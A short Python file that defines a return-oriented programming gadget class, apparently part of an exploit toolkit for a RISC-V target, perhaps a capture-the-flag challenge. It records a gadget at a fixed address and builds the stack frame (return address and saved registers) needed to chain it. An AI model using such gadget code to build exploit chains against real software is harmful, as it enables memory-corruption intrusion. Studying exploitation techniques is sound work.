from bf_parser.rop_gadgets_base_class import ROP_Gadget

class StoreA0(ROP_Gadget):
    '''
    sw a0, 0(s0)
    ld ra, 0x28(sp)
    seqz a4, a5
    sw a4, 4(s0)
    ld s0, 0x20(sp)
    ld s1, 0x18(sp)
    ld s2, 0x10(sp)
    ld s3, 0x8(sp)
    snez a0, a5
    addi sp, sp, 0x30
    '''
    def __init__(self):
        super().__init__(0x4443a, 0x30)

    def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0):
        data = [0, s3, s2, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()